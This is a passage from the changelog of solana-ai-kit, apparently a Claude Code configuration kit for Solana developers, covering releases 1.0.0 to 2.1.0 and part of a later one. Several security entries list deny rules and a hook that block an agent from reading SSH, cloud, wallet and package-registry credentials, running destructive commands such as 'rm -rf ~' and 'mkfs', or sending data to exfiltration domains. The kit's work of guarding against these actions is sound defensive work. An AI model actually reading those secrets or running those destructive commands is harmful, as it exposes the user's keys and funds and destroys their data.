- **Egress is documented as unenforceable, not claimed** — `sandbox.network.strictAllowlist` has no effect from the scopes the kit writes, and `sandbox.credentials` is not applied from project or local settings at all. What ships is a `deniedDomains` exfil denylist, command rules for `npm publish`/`cargo publish`/`git push`, and the egress hook; `strictAllowlist` is documented as a line the user adds to `~/.claude/settings.json`. Local MCP servers run outside the sandbox and outside every rule and hook, so attaching servers beyond the three defaults removes the guarantee. Relaxed's honest guarantee is "your secrets won't additionally reach a third party", not confidentiality.
- **`--agents` installs are unfirewalled** — `settings.json` is inert there; `.claude/security.json` installs with its paths rewritten and the mode is documented rather than silently looking protected.
- **Always-loaded context cut ~91%** (#66) — the five `.claude/rules/` files used `globs:`, which Claude Code ignores, so all of them loaded every session. They are gone; CLAUDE-solana.md drops to 36 lines, agent descriptions are routing-only, and agent, command and hub bodies are slimmed. `validate.sh` fails on an unscoped rule and on over-budget descriptions.
- **settings.json stops pinning session behavior** — drops the agent-teams env flag, `enableAllProjectMcpServers`, the top-level `defaultMode`, the LSP `enabledPlugins` and `modelDefaults`. `/update` removes these from installs made by kit 2.1.0 or earlier, only where they still hold the kit's value.
- **Default MCP servers trimmed** to helius, solana-dev (now native HTTP) and context7. playwright, surfpool and context-mode are opt-in; memsearch is dropped.
- **Hooks** — read stdin JSON and block with exit 2; the Stop, SubagentStop, PostToolUse and git-commit hooks are removed; SessionStart shows the banner to the user and gives Claude the RPC host and wallet. The plugin's `hooks.json` mirrors settings.json, including the secrets gate.
- **Sandbox** — git push/pull/fetch and `gh pr/run/issue` run outside it; local binding is allowed for validators and dev servers; `gh auth token` is denied.
- **`install.sh --agents`** writes AGENTS.md (HTML comments stripped), rewrites project `.claude/` paths to `.agents/`, registers `ext/` packs under `.agents/skills/ext/`, and no longer installs `/cleanup`.
- **Repo renamed** to `solanabr/ai-kit` (the frozen `update.sh:16` keeps the old URL; GitHub redirects it).
- **Skill submodules resynced** to upstream HEAD, with moved paths updated in agents, commands and the hub.
- **Plugin skills hub** moved to `plugin/skills/solana-ai-kit/SKILL.md` so every bundled skill registers (#118).

### Removed
- `.claude/rules/` (anchor, dotnet, pinocchio, rust, typescript).
- `.claude/skills/token-2022.md` (replaced by the token-extensions skill).
- Drift and Ranger Finance references (protocols gone).
- The live `claude-code.yml` workflow (moved to a template, stopping duplicate `@claude` runs).

## [2.1.0] - 2026-06-26

### Added
- **`/commit-claude-config` command** — opt back into version-controlling the kit. Strips the config block from `.gitignore`, then stages and commits `.claude/` (or `.agents/`), `CLAUDE.md`, `.mcp.json`, and `.gitmodules`. Keeps `ext/` submodules ignored (re-fetched via `git submodule update`), so it doesn't vendor 18 upstream repos. Detects `--agents` installs.
- **Config gitignored by default** — `install.sh` now adds `.gitmodules`, the config dir (`.claude/`/`.agents/`), `CLAUDE.md`, and `.mcp.json` to `.gitignore` so the kit reads as ignorable infrastructure and stays out of `git status`. Written as a marked block (`# >>> solana-ai-kit config … <<<`) so `/commit-claude-config` can remove it surgically. Safe by git semantics: already-tracked files are unaffected. The install output + README/QUICK-START document the default and the opt-in.

### Security
- **`.env` gitignored** — `install.sh` now adds `.env`/`.env.local` to `.gitignore` (the installer creates `.env` from `.env.example`, which holds API keys once filled). `.env.example` stays tracked.

### Changed
- **Parallel + shallow submodule fetch** — `install.sh` clones with `--shallow-submodules --jobs N` (floor 8) and runs `git submodule update --init --recursive --jobs N`, fetching the 18 `ext/` skill submodules concurrently at their pinned commits instead of serially. Tag resolution (`git ls-remote`) is skipped on local-source installs.
- **Banner byline centered + darkened** — the `by @SuperteamBR 🇧🇷` line (install banner + SessionStart hooks) is centered under the logo and uses a dim dark-gray so it reads as a subtle subtitle.
- Command count 29 → 30.

## [2.0.2] - 2026-06-16

### Security
- **Deny read/write access to browser-extension wallet storage** (Chrome, Brave, Edge, Firefox, Chromium, Opera, Vivaldi, Arc — across macOS, Linux, and Windows) — the profile data dirs where Phantom/Solflare/Backpack/MetaMask and other extension wallets keep encrypted vaults (`Local Extension Settings/`, `IndexedDB/`, `Local Storage/`). Added as `sandbox.denyWrite` path prefixes and `permissions.deny` `Read(...)` globs (plus a cross-cutting `Read(**/Local Extension Settings/**)`); broad profile-dir deny is wallet-agnostic and future-proof
- **Added `gate-bash-secrets` PreToolUse hook** — blocks shell (Bash) reads of private keys, wallet vaults, and credentials (exits non-zero before the command runs). Covers the key/cred paths plus all browser profile dirs above; carefully scoped so program keypairs in `target/deploy/`, project `*.pem` certs, and browser *binaries* (`google-chrome --headless`) stay allowed
- **Read-tool deny coverage for key/cred paths** — `permissions.deny` now also has `Read(...)` globs for `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.config/solana/id.json`, `~/.npmrc`, `~/.git-credentials`, `~/.netrc`, `~/.config/gh/hosts.yml`, `~/.kube/config`, `~/.cargo/credentials.toml`, `~/.docker/config.json`, `~/.pypirc`, `~/.gem/credentials` (complements the v2.0.1 `denyWrite` + the new Bash hook)

## [2.0.1] - 2026-06-16

### Security
- **Expanded `sandbox.denyWrite`** with specific credential/key files (kept the existing 4): `~/.netrc`, `~/.git-credentials`, `~/.npmrc`, `~/.cargo/credentials.toml`, `~/.docker/config.json`, `~/.config/gh/hosts.yml`, `~/.kube/config`, `~/.pypirc`, `~/.gem/credentials` — targeted credential files only (not whole tool dirs, so legit `cargo`/`gh`/`solana config` operations still work)
- **Expanded `permissions.deny`** with curated low-UX-cost guards: secret-read/exfil (`cat`/`less`/`xxd` of `*id.json`, `*keypair*.json`, `~/.ssh/*`, `~/.config/solana/*.json`, `~/.aws/*`, `~/.gnupg/*`, `*.pem`, `~/.config/gh/hosts.yml`, `~/.npmrc`, `~/.git-credentials`, `~/.netrc`); destructive-fs (`mkfs*`, `rm -rf ~`/`~/*`/`.git`/`.git/*`, `git clean -fdx*`/`-fX*`); mainnet authority/funds ops (`solana program set-upgrade-authority`, `spl-token set-authority`, `solana program close`, `solana withdraw-from-stake-account`/`-vote-account`)

### Changed
- **`/cleanup`** now also strips the kit's distribution/maintenance infra from forked-template projects: `.claude-plugin/`, `plugin/`, `vercel.json`, plus the kit-only `.claude/CHANGELOG.md` (all removed defensively, only if present)

## [2.0.0] - 2026-06-15

### Added
- **Brand ASCII banner (SessionStart + installer)**: slanted SOLANA wordmark (echoes the Solana logotype) + robotic half-block AI KIT tier, 7-row purple→green gradient, with NO_COLOR/plain-terminal fallback
- **`/doctor` command**: read-only health check for the dev environment and solana-ai-kit config — one exact fix-it command per failure
- **`/audit-infra` command**: infrastructure-first security audit (secrets archaeology, dependency supply chain, CI/CD, LLM/skill security, OWASP Top 10, STRIDE) — adapted from cso by gstack (via sendaifun/solana-new, MIT), telemetry-free
- **`/product-review` command**: product quality review with 8-dimension scorecard; `--harsh` for the brutal roast variant
- **`/dream` command**: memory consolidation — dedupe, contradiction-check, prune, re-rank MEMORY.md + CLAUDE.md Project Learnings
- **Submodules**: `ext/solana-new` ([sendaifun/solana-new](https://github.com/sendaifun/solana-new), pinned), `ext/ghostsecurity` ([ghostsecurity/skills](https://github.com/ghostsecurity/skills)), `ext/defending-code` ([anthropics/defending-code-reference-harness](https://github.com/anthropics/defending-code-reference-harness))
- **GTM wrapper skills**: `idea-sprint`, `pitch-deck`, `hackathon` — thin local wrappers routing into ext/solana-new journey skills and datasets (marketing-video is reference-routed from the hub, no wrapper)
- **`.claude/context/` phase-handoff convention**: gitignored scratch dir for idea→build→launch context files
- **Permissions**: deny `Bash(curl *convex.cloud*)` — backstop against upstream telemetry preambles
- **Surfpool MCP server in the standard install** (keyless; agent-driven local-validator / mainnet-fork control; requires the surfpool CLI) — MCP servers 6→7
- **Claude Code plugin distribution** — in-repo marketplace (`.claude-plugin/marketplace.json`, marketplace name `stbr`) + symlinked `plugin/` core-plugin (agents, commands, local skills, MCP, hooks); published via the `stbr` marketplace (`/plugin install solana-ai-kit@stbr`); commands namespace as `/solana-ai-kit:<name>`. `install.sh` remains the full install for `.claude/rules`, the permissions/sandbox policy, and the 18 ext/ submodules (plugins can't carry submodules); `/doctor` gains a dual-install guard
- **`skill-registry.json`** — structured machine-readable catalog of opt-in add-on skills/plugins/MCPs (install-on-demand, not bundled by default); curated + deduped against solana-new's catalogs
- One-line install endpoint **aikit.superteam.codes** (Vercel 308 redirect → install.sh; pulls + installs the latest release). Docs updated; raw GitHub URL retained as fallback.

### Changed
- **Resynced ext submodules to upstream HEADs** (9 advanced): sendai (−drift +phoenix/ranger-finance/lavarage/lifi/arcium/birdeye/wallet-analysis/carbium/sol-incinerator), cloudflare (agents-sdk folds in MCP/AI-agent deployment; +sandbox-sdk), qedgen, safe-solana-builder, solana-dev, solana-mobile, trailofbits, colosseum, vercel; defending-code/ghostsecurity/solana-game/solana-new already at upstream HEAD. Hub SKILL.md routing refreshed (drift row dropped, perps→ranger-finance, +cross-chain/encrypted-compute rows); README sendai purpose de-references Drift
- **Replaced the `registry/` prose skill with `skill-registry.json`** + a master-`SKILL.md` pointer (leaner): the scouting methodology and curated watchlists fold into the structured catalog; the hub's "Registry & Monitoring" section and routing row are dropped
- **Resynced vercel-labs/agent-skills** — `vercel-optimize` + `writing-guidelines` skills now present under `ext/vercel`
- **Project renamed** solana-claude-config → **solana-ai-kit** (repo URL `solanabr/solana-ai-kit`): all docs, installer, and update-tooling references updated; env vars renamed to `SOLANA_AI_KIT_*` (`SOLANA_AI_KIT_LOCAL_SRC`, `SOLANA_AI_KIT_UPSTREAM`, `SOLANA_AI_KIT_BRANCH`) with `SOLANA_CLAUDE_*` back-compat fallbacks; VERSION package name updated
- Enriched `solana-researcher` (DeFi market research + competitive landscape), `rust-backend-engineer` (indexer non-negotiables), `solana-guide` (EVM→Solana concept map + incubator loop), `token-engineer` (tokenomics pre-launch checklist), `/debug-user-tx` (common pitfalls encyclopedia), `/deploy` + `deployment.md` (upgrade-authority staging timeline)
- Skills hub (`SKILL.md`) routing for GTM journey skills and the new security submodules
- README Credits: full MIT notice for sendaifun/solana-new, cso/gstack credit, Apache-2.0 submodule notes, idea-dataset primary sources (Superteam, YC, a16z, Alliance)
- README submodule/credits rows decluttered — inline license tags removed, license notices consolidated in Credits

### Fixed
- Stale test counts and settings assertion
- README submodule link + workflows tree
- CLAUDE.md rules-frontmatter terminology
- Retroactive tags v1.4.0/v1.5.0

## [1.5.0] - 2026-04-20

### Added
- **`/debug-user-tx` command**: Reproduce a user-reported failing transaction against forked cluster state and map the error back to source. Fetches tx via RPC, identifies the failing instruction, decodes the handler discriminator (Anchor IDL ≥0.30 or `sha256("global:<name>")` for <0.30), maps Anchor `Custom(N)` codes + well-known constraint codes (2000–3012) to `#[error_code]` variants with file:line pointers, diffs writable account state, and optionally replays via Surfpool (fork) or LiteSVM. Supports three modes: signature given, tx never landed, or failure inside an external CPI target.

## [1.4.0] - 2026-04-02

### Added
- **Vercel submodule**: `ext/vercel` from [vercel-labs/agent-skills](https://github.com/vercel-labs/agent-skills) — Vercel deployment, Next.js, AI SDK, v0, edge functions
- SKILL.md routing for Vercel & deployment platform skills

### Changed
- **VERSION format**: Now includes package name (`solana-claude-config 1.4.0`) for clarity
- **install.sh / update.sh**: `.gitmodules` merge instead of overwrite — preserves user-defined submodules
- **install.sh / update.sh**: No longer ship `CHANGELOG.md` to user projects (stays in source repo)
- **install.sh / update.sh**: No longer ship `MEMORY.md` template (Claude creates it organically)
- **install.sh / update.sh**: No longer create `CLAUDE.local.md` boilerplate (Claude creates it when needed)

### Removed
- `CHANGELOG.md` from install/update targets (maintainer-only file)
- `MEMORY.md` from install protected files (interfered with organic memory)
- `CLAUDE.local.md` boilerplate creation (Claude handles this itself)

## [1.3.0] - 2026-04-01

### Fixed
- **MCP servers not loading**: Moved `.claude/mcp.json` → `.mcp.json` (project root) — Claude Code only reads `.mcp.json` at project root, the old path was silently ignored
- **MCP servers stuck in pending**: Added `enableAllProjectMcpServers: true` to `settings.json` — without this, project-level MCP servers require manual approval and are silently skipped

### Changed
- Replaced Puppeteer MCP server with Playwright (`@playwright/mcp`) — actively maintained by Microsoft, Puppeteer MCP is unmaintained
- `install.sh` now places `.mcp.json` at project root instead of inside `.claude/`
- `update.sh` updated to handle `.mcp.json` at project root

### Added
- Tests for MCP file location (must be at root, not `.claude/`) and `enableAllProjectMcpServers` setting

## [1.2.1] - 2026-03-31

### Fixed
- `install.sh` nesting bug: installing into a directory with existing `.claude/` created `.claude/.claude/` instead of merging
- `install.sh` now preserves user files (`settings.json`, `mcp.json`, `MEMORY.md`) on reinstall instead of overwriting

### Added
- `test_install_existing_claude.sh` — verifies install into pre-existing `.claude/` directory (no nesting, user files preserved, upstream content installed)
- Enhanced `test_install_idempotent.sh` with nesting checks and user file preservation assertions

## [1.2.0] - 2026-03-31

### Added
- `test_settings_deep.sh` — deep validation of settings.json structure (env, sandbox, plugins, permissions, hooks, model defaults)
- `test_cross_references.sh` — Ripple Map enforcer: cross-validates agent/command/MCP counts and names across README, QUICK-START, and CLAUDE-solana.md
- `test_install_idempotent.sh` — verifies double-install safety (backups, no duplicates, preserved local files)
- `test_cleanup.sh` — simulates /cleanup command contract (scaffolding removal, config preservation)
- `test_resync.sh` — static analysis of resync.sh integrity and submodule state
- 5 new assertion helpers: `assert_file_not_exists`, `assert_dir_not_exists`, `assert_file_contains`, `assert_file_not_contains`, `assert_count`
- CI OS matrix: ubuntu-latest + macos-latest (fail-fast: false)
- CI smoke-test job: fresh install + agents-mode install validation
- CI badge in README.md

### Changed
- `test_update.sh` rewritten: 8 → 22 assertions (dry-run, upstream detection, protected files, agents mode)
- CI JSON validation switched from `jq` to `python3` for portability
- Total test assertions: ~195 → 340 across 14 suites (was 9)

## [1.1.0] - 2026-03-31

### Added
- `/cleanup` command for forked template users to initialize project and remove scaffolding
- `/resync` command (replaces `/update-skills`) for submodule resync with integrity verification
- `CLAUDE.local.md` — private, gitignored scratchpad for per-machine notes
- Self-learning tiered system: strict (tracked CLAUDE.md) + relaxed (private CLAUDE.local.md)
- Monorepo guidance: subdirectory CLAUDE.md auto lazy-loads
- `.claude/bin/resync.sh` — submodule resync script

### Changed
- `/upgrade` renamed to `/update` (`.claude/bin/upgrade.sh` → `.claude/bin/update.sh`)
- `VERSION` and `CHANGELOG.md` moved inside `.claude/` (no longer pollute project root)
- Root `update.sh` is now a thin deprecation wrapper → `.claude/bin/update.sh`
- Token Loading Model table updated with confirmed loading behaviors
- `install.sh` now creates `CLAUDE.local.md` and adds it to `.gitignore`
- `settings.json` env vars: added `BASH_MAX_OUTPUT_LENGTH`, `MAX_MCP_OUTPUT_TOKENS`

### Removed
- `/upgrade` command (replaced by `/update`)
- `/update-skills` command (replaced by `/resync`)
- `.claude/bin/upgrade.sh` (replaced by `.claude/bin/update.sh`)
- Root `VERSION` and `CHANGELOG.md` (moved to `.claude/`)

## [1.0.0] - 2026-03-31

### Added
- 15 specialized Solana agents (Anchor, Pinocchio, DeFi, Frontend, Mobile, Unity, etc.)
- 23 slash commands for building, testing, deploying, and auditing
- 9 external skill submodules (Solana Foundation, SendAI, Trail of Bits, Cloudflare, QEDGen, Colosseum, solana-mobile, solana-game, safe-solana-builder)
- Progressive-loading skill hub with protocol-specific routing
- 6 MCP server integrations (Helius, solana-dev, Context7, Puppeteer, context-mode, memsearch)
- Agent teams support via CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS
- Dual install modes: full Claude Code + agents-only (Cursor/Windsurf/Copilot)
